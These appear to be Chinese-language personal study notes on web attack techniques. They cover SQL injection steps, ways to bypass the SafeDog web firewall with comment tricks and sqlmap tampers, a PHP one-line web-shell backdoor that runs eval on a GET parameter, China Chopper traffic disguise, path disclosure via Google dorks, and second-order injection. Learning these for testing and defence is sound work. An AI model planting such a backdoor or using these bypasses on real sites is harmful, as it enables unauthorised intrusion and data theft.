```shell
# 安全狗拦截
#mysql的注入方式
#通过这样的方式:注释
/*x*/union select ...

/*!xxxx*/

sqlmap tamper插件 过狗

```



一个注入的流程：

```shell
# 1.判断是否有注入点：and 1=1 ; and 1=2

# 3.判断SQL查询的字段的个数，order by 1; order by 2,一个一个的试试

# 3.过安全狗

# 4.注入SQL，拿到想要的数据

# 5.python实现（发包，过狗规则，匹配结果）

```

表面免杀

```php
/*网站后门*/
<?php
$code = $_GET['x'];
//执行远程命令
eval($code)
?>
```



过狗一句话

菜刀的原理

```shell
#通过eval/assert执行代码，而执行的代码中包含文件管理的执行，所以可以返回文件管理的数据包

```

可以通过菜刀执行上述逻辑



过狗菜刀：避免菜刀的特征，比如修改base64加解密等方式，可以手动模拟过狗



行为免杀



TODO
需要学习一下Python的爬虫模块，正则模块



目录扫描的逻辑： 内置URL字典

domain/url



请求方式的注入及特点

我们自己写注入语句，可能只是会在GET，POST，COOKIE，HEAD中单独的写注入语句，但是工具可能会帮我们在上述所能注入的地方都写上，这就是工具的好处



网站绝对路径的获取方法

1. 报错显示

2. 谷歌黑客（谷歌语法）

   ```shell
   site domain.com warning
   ```

3. 遗留文件

   php info test 等文件

4. 读取搭建平台的配置文件

5. 社工（漏洞、爆破等）



数据类型

字符类型：单引号的问题

数字类型：

搜索类型：like



二次注入

特性：

1. 黑盒测试无法发现（wvs类型扫描软件）
2. 产生二次注入集中在交互区（评论，留言等）

攻击者尝试留言或评论，输入数据将插入到数据库中，网站会将输入的数据显示

1. 插入数据 insert
2. 执行显示数据 select；



攻击者通过将用户名写成注入语句，用户中心以接受用户名为查询用户情况，注入产生流程

1. 先将注入语句以用户名插入到数据库中
2. 点击用户名即传输语句重新组合



base64编码：

如果参数值是经过编码的，那么我们的注入也是要进过base64编码之后来注入

